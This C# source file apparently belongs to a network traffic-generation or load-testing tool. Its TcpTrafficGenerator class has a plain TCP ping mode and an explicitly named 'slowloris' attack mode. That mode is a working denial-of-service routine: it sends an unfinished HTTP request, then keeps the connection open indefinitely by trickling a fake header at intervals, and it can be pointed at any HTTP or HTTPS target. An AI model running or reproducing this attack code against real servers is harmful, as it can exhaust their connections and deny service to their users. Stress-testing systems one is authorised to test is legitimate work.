using System;
using System.Diagnostics;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using UIIA.Models;


namespace UIIA.Services
{
    public class TcpTrafficGenerator : ITrafficGenerator
    {
        public string Protocol => "tcp";

        public async Task<MetricRecord> SendRequestAsync(string target, TestConfig config)
        {
            if (config.AttackMode == "slowloris")
            {
                return await SlowlorisAttackAsync(target, config);
            }

            return await StandardTcpAsync(target, config);
        }

        private async Task<MetricRecord> StandardTcpAsync(string target, TestConfig config)
        {
            var record = new MetricRecord();
            var stopwatch = Stopwatch.StartNew();

            try
            {
                var uri = new Uri(target);
                using var client = new TcpClient();

                var connectTask = client.ConnectAsync(uri.Host, uri.Port);
                if (await Task.WhenAny(connectTask, Task.Delay(config.TimeoutMs)) != connectTask)
                {
                    throw new TimeoutException("Connection timed out.");
                }

                using var stream = client.GetStream();
                var message = "PING\r\n";
                var buffer = Encoding.ASCII.GetBytes(message);

                await stream.WriteAsync(buffer, 0, buffer.Length);

                var responseBuffer = new byte[1024];
                var bytesRead = await stream.ReadAsync(responseBuffer, 0, responseBuffer.Length);

                record.ResponseSizeBytes = bytesRead;
                record.StatusCode = 200;
                record.IsError = false;
            }
            catch
            {
                record.IsError = true;
                record.StatusCode = -1;
            }

            stopwatch.Stop();
            record.LatencyMs = stopwatch.ElapsedMilliseconds;
            record.Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();

            return record;
        }

        private async Task<MetricRecord> SlowlorisAttackAsync(string target, TestConfig config)
        {
            var record = new MetricRecord();
            var stopwatch = Stopwatch.StartNew();

            try
            {
                var uri = new Uri(target);
                var host = uri.Host;
                var port = uri.Port > 0 ? uri.Port : (uri.Scheme == "https" ? 443 : 80);

                using var client = new TcpClient();
                var connectTask = client.ConnectAsync(host, port);
                if (await Task.WhenAny(connectTask, Task.Delay(config.TimeoutMs)) != connectTask)
                {
                    throw new TimeoutException();
                }

                Stream stream = client.GetStream();

                if (uri.Scheme == "https")
                {
                    var sslStream = new SslStream(stream, false);
                    await sslStream.AuthenticateAsClientAsync(host);
                    stream = sslStream;
                }

                var writer = new StreamWriter(stream, Encoding.ASCII) { AutoFlush = false };
                await writer.WriteAsync($"GET / HTTP/1.1\r\n");
                await writer.WriteAsync($"Host: {host}\r\n");
                await writer.WriteAsync("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n");
                await writer.WriteAsync("Accept: */*\r\n");
                await writer.WriteAsync("Connection: keep-alive\r\n");
                await writer.FlushAsync();

                _ = HoldConnectionAsync(writer, config);

                record.StatusCode = 200;
                record.IsError = false;
            }
            catch
            {
                record.IsError = true;
                record.StatusCode = -1;
            }

            stopwatch.Stop();
            record.LatencyMs = stopwatch.ElapsedMilliseconds;
            record.Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();

            return record;
        }

        private async Task HoldConnectionAsync(StreamWriter writer, TestConfig config)
        {
            try
            {
                var delay = config.PacketDelayMs > 0 ? config.PacketDelayMs : 1000;
                while (true)
                {
                    await Task.Delay(delay);
                    await writer.WriteAsync("X-a: b\r\n");
                    await writer.FlushAsync();
                }
            }
            catch
            {
            }
        }
    }
}